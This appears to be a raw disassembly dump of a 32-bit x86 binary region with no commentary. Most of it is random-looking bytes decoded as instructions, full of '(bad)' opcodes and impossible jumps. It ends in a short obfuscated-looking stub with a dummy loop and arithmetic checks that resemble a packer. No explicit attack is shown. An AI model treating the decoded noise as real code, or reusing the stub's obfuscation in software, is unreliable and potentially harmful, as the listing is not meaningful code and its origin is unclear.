  40fb60:	lods   al,BYTE PTR ds:[esi]
  40fb61:	(bad)  
  40fb62:	int3   
  40fb63:	idiv   bh
  40fb65:	loopne 0x40fbc1
  40fb67:	dec    eax
  40fb68:	les    ecx,FWORD PTR [esi-0x62]
  40fb6b:	sbb    al,0x2e
  40fb6d:	push   0xfffffff2
  40fb6f:	mov    edi,0x5a3f4586
  40fb74:	sbb    al,0xc9
  40fb76:	jp     0x40fbe6
  40fb78:	xchg   edi,esp
  40fb7a:	push   ss
  40fb7b:	stos   BYTE PTR es:[edi],al
  40fb7c:	fwait
  40fb7d:	adc    edi,esp
  40fb7f:	jecxz  0x40fb6f
  40fb81:	pop    esi
  40fb82:	int    0x1e
  40fb84:	and    BYTE PTR [edx],bh
  40fb86:	adc    esi,DWORD PTR [esi]
  40fb88:	lods   eax,DWORD PTR ds:[esi]
  40fb89:	pop    edx
  40fb8a:	pop    ebx
  40fb8b:	cld    
  40fb8c:	cmp    BYTE PTR [edx-0x4cff66de],cl
  40fb92:	lahf   
  40fb93:	lods   eax,DWORD PTR ds:[esi]
  40fb94:	mov    eax,0x1497c58
  40fb99:	lods   al,BYTE PTR ds:[esi]
  40fb9a:	add    ebx,DWORD PTR [ebp+0x5b]
  40fb9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb9e:	push   ebx
  40fb9f:	and    BYTE PTR [ecx+edi*4+0x1c],0x12
  40fba4:	mov    ah,0x66
  40fba6:	cmp    esp,DWORD PTR [eax+0x6f]
  40fba9:	fsub   st,st(2)
  40fbab:	cli    
  40fbac:	test   DWORD PTR [ebp+esi*2-0x2249502],ecx
  40fbb3:	dec    ecx
  40fbb4:	or     dl,BYTE PTR [ebx+0x1f]
  40fbb7:	mov    ecx,DWORD PTR [esi-0x4]
  40fbba:	mov    ds:0xa9ac0955,al
  40fbbf:	add    BYTE PTR [esi-0x42cdabbc],dh
  40fbc5:	jmp    0xc94bbfea
  40fbca:	idiv   BYTE PTR [edi+ebp*2+0x5abc36b]
  40fbd1:	int3   
  40fbd2:	jecxz  0x40fb81
  40fbd4:	adc    al,0xca
  40fbd6:	dec    esi
  40fbd7:	retf   0xbc19
  40fbda:	cwde   
  40fbdb:	pop    edi
  40fbdc:	cs and al,dh
  40fbdf:	and    DWORD PTR [ebx+0x707b0ccf],ebp
  40fbe5:	je     0x40fbac
  40fbe7:	inc    esi
  40fbe8:	stc    
  40fbe9:	and    bh,BYTE PTR ds:0xa7494023
  40fbef:	sbb    eax,DWORD PTR [ebp-0x5fc1e92e]
  40fbf5:	test   DWORD PTR [ebx],eax
  40fbf7:	mov    edx,0x68c7e57a
  40fbfc:	test   al,0x97
  40fbfe:	cmp    cl,BYTE PTR [edx+0x423634aa]
  40fc04:	(bad)
  40fc07:	lock add eax,0xe9b8f305
  40fc0d:	neg    DWORD PTR [esi]
  40fc0f:	jmp    0x1d83:0x16a3aff7
  40fc16:	adc    ch,ch
  40fc18:	imul   esi,DWORD PTR [esi+0x40],0x12
  40fc1c:	fld    DWORD PTR [ebx*1-0x1a46a51a]
  40fc23:	sbb    DWORD PTR [ebp-0x51],esi
  40fc26:	sbb    BYTE PTR [edx],dh
  40fc28:	fdivr  st(5),st
  40fc2a:	sub    BYTE PTR [ecx+0x3cda349],cl
  40fc30:	int    0xf9
  40fc32:	pop    edi
  40fc33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc34:	jne    0x40fbd3
  40fc36:	or     al,0xf7
  40fc38:	out    dx,al
  40fc39:	xchg   ebp,eax
  40fc3a:	pop    edx
  40fc3b:	dec    esp
  40fc3c:	std    
  40fc3d:	xchg   DWORD PTR [edi+0x2c],ebx
  40fc40:	sahf   
  40fc41:	xor    BYTE PTR [edi],bh
  40fc43:	cmp    ebp,DWORD PTR [esi-0x4e5376b5]
  40fc49:	(bad)  
  40fc4a:	(bad)  
  40fc4c:	je     0x40fc94
  40fc4e:	lods   al,BYTE PTR ds:[esi]
  40fc4f:	sub    al,0x6d
  40fc51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc52:	into   
  40fc53:	pop    esp
  40fc54:	and    ecx,DWORD PTR [ebx+0x12]
  40fc57:	fistp  WORD PTR [eax+0x1a0bbc24]
  40fc5d:	jecxz  0x40fc0c
  40fc5f:	lahf   
  40fc60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc61:	(bad)  
  40fc62:	ds mov ah,0x3b
  40fc65:	jmp    0x68549af
  40fc6a:	bound  eax,QWORD PTR [eax+eiz*8-0x61]
  40fc6e:	fnstenv [edx-0x46]
  40fc71:	and    eax,0x24e2ff78
  40fc76:	jbe    0x40fc9e
  40fc78:	mov    WORD PTR [bp+0x33],?
  40fc7c:	into   
  40fc7d:	mov    edx,0x1c50296a
  40fc82:	retf   0x370a
  40fc85:	ins    BYTE PTR es:[edi],dx
  40fc86:	push   edi
  40fc87:	or     al,0x61
  40fc89:	aam    0x2a
  40fc8b:	or     eax,0x41beead1
  40fc90:	fiadd  DWORD PTR [esi+eiz*8]
  40fc93:	and    BYTE PTR [edi],ch
  40fc95:	fisttp WORD PTR [eax-0x425cfb0e]
  40fc9b:	pop    ss
  40fc9c:	jno    0x40fc42
  40fc9e:	aas    
  40fc9f:	sub    ch,BYTE PTR [eax-0x26]
  40fca2:	mov    esp,0x1fb356a5
  40fca7:	add    eax,0x1208608b
  40fcac:	ja     0x40fc5b
  40fcae:	clc    
  40fcaf:	js     0x40fcf2
  40fcb1:	and    ah,BYTE PTR [ebx+0x59d0a2e8]
  40fcb7:	stos   DWORD PTR es:[edi],eax
  40fcb8:	mov    dh,0x86
  40fcba:	(bad)  
  40fcbb:	or     eax,0x1ebb317c
  40fcc0:	cmc    
  40fcc1:	nop
  40fcc2:	sbb    DWORD PTR [esp+eax*1+0x49b660ab],edx
  40fcc9:	adc    ecx,DWORD PTR [edx]
  40fccb:	pop    esi
  40fccc:	bound  edi,QWORD PTR [ebx+eax*1]
  40fccf:	icebp  
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	shr    DWORD PTR [eax],0xa4
  40fce5:	xchg   esp,eax
  40fce6:	ud1    esi,DWORD PTR [ebx+0x7cac7e7e]
  40fced:	jle    0x40fd6d
  40fcef:	xor    DWORD PTR [ebx+0x34817166],esp
  40fcf5:	pop    esp
  40fcf6:	add    ebp,0x59
  40fcf9:	add    eax,0x1a909648
  40fcfe:	inc    edi
  40fcff:	adc    ecx,DWORD PTR [esi+eiz*4+0x2de0a504]
  40fd06:	push   ss
  40fd07:	sub    dl,BYTE PTR [edi-0x31]
  40fd0a:	ret    0x49f5
  40fd0d:	(bad)  
  40fd0e:	popa   
  40fd0f:	popa   
  40fd10:	add    DWORD PTR [ebp+0x62],ebp
  40fd13:	inc    eax
  40fd14:	inc    eax
  40fd15:	iret   
  40fd16:	xchg   edi,eax
  40fd17:	imul   esp,DWORD PTR [ebx+ecx*4-0x33],0xa917361b
  40fd1f:	repnz jmp 0x27a:0xcd9ad7a6
  40fd27:	adc    ebp,DWORD PTR [edx-0x6a3c471e]
  40fd2d:	repnz inc esp
  40fd2f:	pop    edi
  40fd30:	push   esp
  40fd31:	add    bl,BYTE PTR [edx+0x46f7dbeb]
  40fd37:	std    
  40fd38:	push   esp
  40fd39:	xor    eax,0x8f1d3f1f
  40fd3e:	xor    BYTE PTR [edi-0xd],dh
  40fd41:	cmp    al,bh
  40fd43:	scas   al,BYTE PTR es:[edi]
  40fd44:	adc    BYTE PTR [ebx+0x7647b66b],al
  40fd4a:	out    0x91,al
  40fd4c:	add    esp,DWORD PTR [eax]
  40fd4e:	pop    ebx
  40fd4f:	or     eax,0xb97c0499
  40fd54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd55:	push   esi
  40fd56:	adc    DWORD PTR [ebx],ebp
  40fd58:	pop    ecx
  40fd59:	lods   al,BYTE PTR ds:[esi]
  40fd5a:	mov    ebx,DWORD PTR [eax]
  40fd5c:	cmp    eax,0x81969a08
  40fd61:	inc    esi
  40fd62:	xor    ch,al
  40fd64:	inc    edi
  40fd65:	or     al,0xc8
  40fd67:	int3   
  40fd68:	dec    esp
  40fd69:	xchg   DWORD PTR [edi+0x7f63db16],ecx
  40fd6f:	jb     0x40fd9d
  40fd71:	enter  0xc53f,0x29
  40fd75:	pop    ebp
  40fd76:	adc    al,0x75
  40fd78:	data16 or BYTE PTR [ecx+0x58472441],dh
  40fd7f:	or     eax,0x9f2bbc94
  40fd84:	(bad)  
  40fd85:	fbstp  TBYTE PTR [edi+0x3fb40e6a]
  40fd8b:	mov    eax,DWORD PTR [eax+0x4454d8c0]
  40fd91:	div    DWORD PTR [eax-0x38c2c577]
  40fd97:	jae    0x40fdba
  40fd99:	mov    es,WORD PTR [edi-0x64]
  40fd9c:	std    
  40fd9d:	lea    esi,[esi+0x4d045870]
  40fda3:	add    BYTE PTR [ebx],bh
  40fda5:	mov    cl,0x70
  40fda7:	or     DWORD PTR [ecx+0x3d66771f],edx
  40fdad:	push   ebx
  40fdae:	stos   BYTE PTR es:[edi],al
  40fdaf:	es inc ebp
  40fdb1:	adc    al,0xda
  40fdb3:	mov    BYTE PTR [edi],0xa3
  40fdb6:	mov    cl,0x15
  40fdb8:	retf   
  40fdb9:	mov    WORD PTR [esi+0xaf02cad],ds
  40fdbf:	push   esp
  40fdc0:	(bad)  
  40fdc1:	std    
  40fdc2:	cmp    ebp,DWORD PTR [ebx-0x61ff8e44]
  40fdc8:	cmp    BYTE PTR [ebx+0x3d677d6d],ah
  40fdce:	fs cs cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  40fdd2:	sub    ebp,DWORD PTR [ebx+0x2522e3d4]
  40fdd8:	je     0x40fdc1
  40fdda:	sar    BYTE PTR [edi+eax*2+0x1d30c752],0xb9
  40fde2:	je     0x40fd84
  40fde4:	(bad)  
  40fde5:	cli    
  40fde6:	out    dx,eax
  40fde7:	js     0x40fe66
  40fde9:	shr    BYTE PTR ds:0x2ebf3e3a,1
  40fdef:	mov    bl,dh
  40fdf1:	inc    esp
  40fdf2:	xchg   edi,eax
  40fdf3:	call   0xc5e556c7
  40fdf8:	jmp    0x3e9ed8f7
  40fdfd:	into   
  40fdfe:	cld    
  40fdff:	test   al,0xc8
  40fe01:	jle    0x40fe03
  40fe03:	jg     0x40fdc9
  40fe05:	loopne 0x40fda0
  40fe07:	or     eax,0x720f51b8
  40fe0c:	xor    al,0x93
  40fe0e:	ss call 0xd4935b31
  40fe14:	xchg   esp,eax
  40fe15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe16:	ds jp  0x40fe32
  40fe19:	jnp    0x40fde5
  40fe1b:	adc    ebx,DWORD PTR [ebx+ebx*2]
  40fe1e:	sti    
  40fe1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe20:	xchg   DWORD PTR [ecx-0x1bf95f87],edx
  40fe26:	fcom   QWORD PTR [ecx-0x1b8bccf1]
  40fe2c:	inc    ebx
  40fe2d:	pop    ss
  40fe2e:	imul   ebp,DWORD PTR [ebx-0x50],0x618bad13
  40fe35:	cwde   
  40fe36:	(bad)  
  40fe37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe38:	frstor ds:0x1c061197
  40fe3e:	gs push es
  40fe40:	out    0x9e,eax
  40fe42:	enter  0xf31f,0xf0
  40fe46:	shl    BYTE PTR gs:[esi],0x20
  40fe4a:	xor    esp,esp
  40fe4c:	dec    eax
  40fe4d:	iret   
  40fe4e:	pusha  
  40fe4f:	push   ds
  40fe50:	ss push ecx
  40fe52:	push   ds
  40fe53:	xchg   esp,eax
  40fe54:	clc    
  40fe55:	std    
  40fe56:	cli    
  40fe57:	test   al,0x5d
  40fe59:	push   ebp
  40fe5a:	pop    ds
  40fe5b:	mov    ebp,edx
  40fe5d:	lods   eax,DWORD PTR ds:[esi]
  40fe5e:	jge    0x40fe45
  40fe60:	xchg   esi,eax
  40fe61:	mov    ecx,DWORD PTR ds:0x1445dc89
  40fe67:	stc    
  40fe68:	and    al,0x34
  40fe6a:	mov    ch,0xbc
  40fe6c:	fcomp  DWORD PTR [edx]
  40fe6e:	push   0x22
  40fe70:	cld    
  40fe71:	xor    DWORD PTR [eax+0x3ebc4311],0xdc5e60d4
  40fe7b:	mov    ah,0x2e
  40fe7d:	cvtpi2ps xmm4,QWORD PTR [edi+0x1aa4b58a]
  40fe84:	lds    ecx,FWORD PTR [eax-0x75]
  40fe87:	pop    edx
  40fe88:	popa   
  40fe89:	cmc    
  40fe8a:	fs sahf 
  40fe8c:	push   edi
  40fe8d:	fsub   DWORD PTR [ecx+0x2f]
  40fe90:	mov    eax,0xeda5bed9
  40fe95:	mov    ecx,0xafa0a414
  40fe9a:	repnz mov ecx,DWORD PTR gs:[esi-0x5d]
  40fe9f:	pop    esp
  40fea0:	push   es
  40fea1:	(bad)  
  40fea2:	pop    ds
  40fea3:	mov    eax,edi
  40fea5:	inc    edi
  40fea6:	shl    DWORD PTR [edx-0x64b9d735],1
  40feac:	rcl    BYTE PTR ds:0x9d090b00,0xf3
  40feb3:	sbb    eax,0xa01630e1
  40feb8:	mov    edi,ebp
  40feba:	aam    0xef
  40febc:	mov    dl,0xfe
  40febe:	add    eax,0xb29695cf
  40fec3:	xor    DWORD PTR [esi-0x49],ebx
  40fec6:	scas   eax,DWORD PTR es:[edi]
  40fec7:	outs   dx,DWORD PTR ds:[esi]
  40fec8:	sbb    ch,al
  40feca:	jp     0x40fe6b
  40fecc:	outs   dx,DWORD PTR ds:[esi]
  40fecd:	jns    0x40fe99
  40fecf:	(bad)  
  40fed0:	outs   dx,BYTE PTR ds:[esi]
  40fed1:	pusha  
  40fed2:	mov    dl,0xa7
  40fed4:	adc    al,ch
  40fed6:	mov    eax,0x3892384e
  40fedb:	(bad)  
  40fedd:	mov    ds:0xdfdb9d18,al
  40fee2:	xor    ebx,DWORD PTR [edx+eax*8+0x2f]
  40fee6:	xchg   esp,eax
  40fee7:	push   esi
  40fee8:	pop    ds
  40fee9:	gs mov cl,0x9
  40feec:	mov    ch,0xb4
  40feee:	dec    esp
  40feef:	mov    al,0x32
  40fef1:	lea    ecx,[ebx+0x23e3bac4]
  40fef7:	ret    
  40fef8:	jb     0x40ff3f
  40fefa:	sub    BYTE PTR [edi],0x80
  40fefd:	leave  
  40fefe:	cs (bad) 
  40ff00:	jmp    0x4730:0x3f2e6ba7
  40ff07:	test   al,0x5c
  40ff09:	xor    dh,bl
  40ff0b:	mov    dh,0x8f
  40ff0d:	pop    ecx
  40ff0e:	xor    bh,0x67
  40ff11:	shl    BYTE PTR [edi+0x70],1
  40ff14:	mov    dh,0xf6
  40ff16:	cmp    eax,0xe0afbf68
  40ff1b:	sub    eax,0x90add369
  40ff20:	cmp    al,0xae
  40ff22:	add    eax,ebp
  40ff24:	cwde   
  40ff25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff26:	out    0x54,eax
  40ff28:	test   DWORD PTR [esi+0x3c],0x807b1e5
  40ff2f:	je     0x40ff79
  40ff31:	or     al,0x3d
  40ff33:	sub    BYTE PTR [edx+eiz*2-0xe],dl
  40ff37:	(bad)  
  40ff38:	mov    esi,0x970f6386
  40ff3d:	push   ss
  40ff3e:	adc    DWORD PTR [edi],eax
  40ff40:	iret   
  40ff41:	out    dx,al
  40ff42:	fld    QWORD PTR [edx]
  40ff44:	std    
  40ff45:	hlt    
  40ff46:	aad    0x28
  40ff48:	add    BYTE PTR [ecx],dh
  40ff4a:	jle    0x40fefa
  40ff4c:	xchg   ebx,eax
  40ff4d:	cwde   
  40ff4e:	cmp    DWORD PTR [ecx-0xa],edx
  40ff51:	inc    esi
  40ff52:	and    DWORD PTR ds:0x423033bc,0x9444c3a7
  40ff5c:	ror    DWORD PTR [ebx-0x6a],1
  40ff5f:	xor    BYTE PTR [edi-0x51],ch
  40ff62:	sub    al,0x8d
  40ff64:	inc    ebp
  40ff65:	aas    
  40ff66:	add    eax,0x3919153f
  40ff6b:	xor    bl,BYTE PTR [ebp-0x76]
  40ff6e:	cmc    
  40ff6f:	aas    
  40ff70:	dec    ebx
  40ff71:	mov    DWORD PTR [edi+0x5553ffeb],edx
  40ff77:	out    dx,al
  40ff78:	arpl   bx,si
  40ff7a:	sub    DWORD PTR [edx-0x21dec36e],0x3a659c25
  40ff84:	mov    gs,WORD PTR [ebx]
  40ff86:	xchg   DWORD PTR [esp+edi*2],esi
  40ff89:	call   0xb897:0x9723352c
  40ff90:	fdivr  QWORD PTR [edx-0x1a]
  40ff93:	pop    ebx
  40ff94:	inc    ecx
  40ff95:	(bad)  
  40ff96:	int    0xa6
  40ff98:	mov    al,ds:0xe67abeb6
  40ff9d:	inc    ebp
  40ff9e:	add    edx,DWORD PTR [ecx-0x48]
  40ffa1:	imul   eax,esi
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433623,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4336e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0x33b139b1
  40ffd9:	enter  0xf72b,0xbe
  40ffdd:	jle    0x41005d
  40ffdf:	lods   al,BYTE PTR ds:[esi]
  40ffe0:	jl     0x410060
  40ffe2:	jle    0x41002f
  40ffe4:	dec    ecx
  40ffe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe6:	mov    ds,WORD PTR [ebp-0x734c3d0a]
  40ffec:	scas   eax,DWORD PTR es:[edi]
  40ffed:	jo     0x40ffbe
  40ffef:	dec    esi
  40fff0:	xor    BYTE PTR [eax+0x39],ch
  40fff3:	dec    edx
  40fff4:	jl     0x40ffca
  40fff6:	mov    eax,ds:0xa8f5ee67
  40fffb:	sub    al,0x62
  40fffd:	popf   
  40fffe:	cmp    BYTE PTR [eax+edx*4],cl
  410001:	cwde   
  410002:	repz push ss
  410004:	cmp    BYTE PTR [ebx-0x50],bh
  410007:	sbb    eax,0xc365d020
  41000c:	jp     0x40ffc9
  41000e:	xchg   esp,eax
  41000f:	adc    al,BYTE PTR ds:0xfe32dce
  410015:	pop    ds
  410016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410017:	mov    ebx,0x34f07f18
  41001c:	cmp    eax,0xf83fa2f4
  410021:	inc    eax
  410022:	mov    DWORD PTR [edi-0x6f],esi
  410025:	adc    bh,ch
  410027:	shl    BYTE PTR [edx+0x3c],0xca
  41002b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41002c:	dec    esi
  41002d:	xchg   BYTE PTR [ecx-0x4ca42a8],ch
  410033:	cmp    BYTE PTR [eax+0x48f5d9fe],bh
  410039:	sbb    DWORD PTR [ebp+0x6d],0xffffff89
  41003d:	add    dl,BYTE PTR [edx]
  41003f:	pop    ebx
  410040:	jp     0x410040
  410042:	xchg   esi,eax
  410043:	nop
  410044:	push   0xf5b34139
  410049:	jmp    0x410006
  41004b:	mov    edx,0x16450f1e
  410050:	xor    dl,ch
  410052:	repz push ecx
  410054:	in     al,dx
  410055:	fistp  WORD PTR [esi+ebp*1+0x53c549c7]
  41005c:	mov    ebx,0xe70a3664
  410061:	inc    esi
  410062:	mov    eax,0xcdb353b2
  410067:	jg     0x41004f
  410069:	outs   dx,DWORD PTR ds:[esi]
  41006a:	repz (bad) 
  41006c:	shr    DWORD PTR [ecx+0x92b55fc],0x70
  410073:	cdq    
  410074:	add    eax,0xb7cfdf6f
  410079:	dec    edx
  41007a:	call   0xfbb85dd4
  41007f:	ror    edx,0x65
  410082:	stos   DWORD PTR es:[edi],eax
  410083:	repz xlat BYTE PTR ds:[ebx]
  410085:	adc    bh,BYTE PTR [edx+ecx*4-0x10e64c3f]
  41008c:	fmul   QWORD PTR cs:[esi]
  41008f:	jp     0x4100f3
  410091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410092:	ja     0x41005d
  410094:	or     eax,0xbf5f70f2
  410099:	stos   BYTE PTR es:[edi],al
  41009a:	call   0x5a1d0542
  41009f:	cli    
  4100a0:	jecxz  0x41008f
  4100a2:	pop    esp
  4100a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100a4:	in     eax,dx
  4100a5:	adc    al,0xd4
  4100a7:	sub    eax,0x47c8612a
  4100ac:	and    DWORD PTR [ebp+0x39],edi
  4100af:	pop    ebp
  4100b0:	jb     0x410117
  4100b2:	jo     0x410089
  4100b4:	mov    ah,0x74
  4100b6:	dec    ebx
  4100b7:	fucom  st(7)
  4100b9:	push   esp
  4100ba:	jecxz  0x4100c5
  4100bc:	adc    DWORD PTR [eax],ebx
  4100be:	call   0x88cd7061
  4100c3:	rcr    BYTE PTR [ebx-0x22],1
  4100c6:	sub    DWORD PTR ds:0x21847564,edx
  4100cc:	iret   
  4100cd:	xchg   si,ax
  4100cf:	fwait
  4100d0:	retf   0xdc6
  4100d3:	adc    ebx,DWORD PTR [ecx]
  4100d5:	out    dx,al
  4100d6:	fadd   QWORD PTR [edi]
  4100d8:	sbb    al,0xdf
  4100da:	sub    DWORD PTR [eax+0x7c255331],edx
  4100e0:	fwait
  4100e1:	jg     0x4100ff
  4100e3:	mov    ebx,0x59ac9c6
  4100e8:	retf   0x853b
  4100eb:	lock mov edi,0xd16e7994
  4100f1:	pop    ss
  4100f2:	jae    0x41012b
  4100f4:	and    ebx,DWORD PTR [edi-0x4efae9f3]
  4100fa:	pop    eax
  4100fb:	dec    BYTE PTR [edi]
  4100fd:	and    esp,DWORD PTR [ebp-0x35468b27]
  410103:	cmp    DWORD PTR [esi+0x5edb34ee],eax
  410109:	lea    esp,[edi+0x16]
  41010c:	jmp    0x4100e0
  41010e:	xchg   esi,eax
  41010f:	jmp    0x4100a6
  410111:	mov    es,WORD PTR [edi+0x149aaa9a]
  410117:	(bad)  
  410119:	cld    
  41011a:	adc    edx,0x510fbf60
  410120:	push   DWORD PTR [esi+0xc]
  410123:	xor    al,0x7b
  410125:	jl     0x4100ce
  410127:	pop    ds
  410128:	retf   0x61c1
  41012b:	jo     0x41010d
  41012d:	icebp  
  41012e:	mov    DWORD PTR [ebp-0x26e91f43],ecx
  410134:	mov    DWORD PTR [ebx+0x76864200],edx
  41013a:	jbe    0x410112
  41013c:	mov    ah,0x75
  41013e:	ins    DWORD PTR es:[edi],dx
  41013f:	mov    ecx,0x52bf5d4a
  410144:	(bad)  
  410145:	mov    esp,0x80531883
  41014a:	(bad)  
  41014b:	and    edx,DWORD PTR [esi]
  41014d:	jo     0x4101c6
  41014f:	in     eax,0x54
  410151:	cmp    esp,DWORD PTR [edx+0x7bb3980f]
  410157:	jecxz  0x41012a
  410159:	iret   
  41015a:	fistp  WORD PTR [eax+ebx*1+0x40be74a3]
  410161:	mov    dl,BYTE PTR [ebp+eax*4-0x53]
  410165:	dec    edi
  410166:	adc    ah,ah
  410168:	adc    DWORD PTR [ebx+0x782da6bf],0xbc918c59
  410172:	xor    al,0xc9
  410174:	ds push esi
  410176:	ins    DWORD PTR es:[edi],dx
  410177:	es mov ecx,0x25f869f6
  41017d:	push   ss
  41017e:	sbb    BYTE PTR [ebp+edx*8-0x200dc3cf],cl
  410185:	dec    ecx
  410186:	ret    0x2207
  410189:	dec    ecx
  41018a:	fs dec edx
  41018c:	pop    esi
  41018d:	xchg   esi,eax
  41018e:	loope  0x410123
  410190:	ret    0x1ba5
  410193:	pop    ss
  410194:	cmp    eax,DWORD PTR [ecx]
  410196:	mov    ch,0x1a
  410198:	xchg   edi,eax
  410199:	sbb    cl,BYTE PTR [ecx+0x6d]
  41019c:	out    dx,al
  41019d:	cwde   
  41019e:	stc    
  41019f:	ss gs or cl,al
  4101a3:	in     eax,0x6
  4101a5:	dec    ecx
  4101a6:	clc    
  4101a7:	rcr    edx,cl
  4101a9:	xlat   BYTE PTR ds:[ebx]
  4101aa:	sub    cl,ah
  4101ac:	(bad)  
  4101ad:	pop    es
  4101ae:	mov    ss,WORD PTR [ebx+0x29]
  4101b1:	scas   al,BYTE PTR es:[edi]
  4101b2:	dec    edi
  4101b3:	iret   
  4101b4:	les    ecx,FWORD PTR [edi+0x5b]
  4101b7:	test   eax,0xc68ea875
  4101bc:	and    DWORD PTR [edx],0xb9693ae1
  4101c2:	inc    esp
  4101c3:	scas   eax,DWORD PTR es:[edi]
  4101c4:	inc    edx
  4101c5:	jb     0x4101e8
  4101c7:	and    ecx,DWORD PTR [edi+esi*8+0x74]
  4101cb:	adc    BYTE PTR [ebx+0x23c1b85f],dh
  4101d1:	fwait
  4101d2:	test   al,0x35
  4101d4:	jb     0x4101bf
  4101d6:	lds    esi,FWORD PTR ds:0x9c0069a3
  4101dc:	jb     0x410202
  4101de:	push   ss
  4101df:	std    
  4101e0:	inc    esi
  4101e1:	in     al,0xff
  4101e3:	and    DWORD PTR [edi],ebx
  4101e5:	stc    
  4101e6:	add    ah,BYTE PTR [edx]
  4101e8:	(bad)  
  4101ea:	adc    esp,DWORD PTR [edx-0x26d66ba3]
  4101f0:	push   esp
  4101f1:	push   edi
  4101f2:	(bad)  
  4101f3:	mov    edi,?
  4101f5:	cwde   
  4101f6:	xor    edx,DWORD PTR [edi+0x6c822ccb]
  4101fc:	ds daa 
  4101fe:	call   0x14ae:0x47c8ef1a
  410205:	sbb    DWORD PTR [ecx],esi
  410207:	mov    ds:0x8533b7f8,eax
  41020c:	mov    ch,0x0
  41020e:	data16 mov ds:0x52f42211,al
  410214:	add    ebp,edi
  410216:	adc    eax,edx
  410218:	retf   
  410219:	fwait
  41021a:	jle    0x4101e7
  41021c:	outs   dx,BYTE PTR ds:[esi]
  41021d:	loope  0x41027d
  41021f:	loop   0x410284
  410221:	outs   dx,DWORD PTR ds:[esi]
  410222:	xor    BYTE PTR [ebx-0x3e],ah
  410225:	je     0x4101c5
  410227:	lds    esi,FWORD PTR [edi-0x2750db39]
  41022d:	mov    DWORD PTR [edx-0x2b2b89b0],ecx
  410233:	cwde   
  410234:	btc    DWORD PTR [edi+0x55],0x28
  410239:	mov    eax,0x6af43085
  41023e:	push   edi
  41023f:	les    edi,FWORD PTR [ebx]
  410241:	and    ah,BYTE PTR [ecx-0x376929db]
  410247:	jae    0x410227
  410249:	pop    edi
  41024a:	inc    edx
  41024b:	pop    eax
  41024c:	retf   
  41024d:	cld    
  41024e:	adc    al,0x98
  410250:	xchg   esi,eax
  410251:	call   0x54b7:0xa6e2e6f3
  410258:	push   cs
  410259:	arpl   WORD PTR [edx-0x1b900e69],di
  41025f:	or     DWORD PTR [edi+0x745db06d],edi
  410265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410266:	mov    ecx,0xc0a7ccbb
  41026b:	arpl   WORD PTR [esi+ebx*4],sp
  41026e:	sar    DWORD PTR [edx+0x45e3eef8],0xd3
  410275:	pushf  
  410276:	or     al,0x6e
  410278:	inc    BYTE PTR [esi-0x6a]
  41027b:	pop    esi
  41027c:	mov    al,ds:0x4d7ea6c1
  410281:	mov    edi,0x5f8fd926
  410286:	mov    eax,ds:0x73b4644a
  41028b:	xchg   esi,eax
  41028c:	(bad)  [ebx+0x71]
  41028f:	push   eax
  410290:	push   ecx
  410291:	retf   
  410292:	fistp  DWORD PTR [esi]
  410294:	stos   DWORD PTR es:[edi],eax
  410295:	mov    esi,DWORD PTR [ebp-0x8]
  410298:	mov    DWORD PTR ds:0x4336eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43360f,0x433703
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433613,0x12
  4102c6:	cmp    DWORD PTR ds:0x433613,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433613,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433613,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433613
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433613,eax
  410303:	mov    eax,ds:0x433613
  410308:	dec    eax
  410309:	mov    ds:0x433613,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
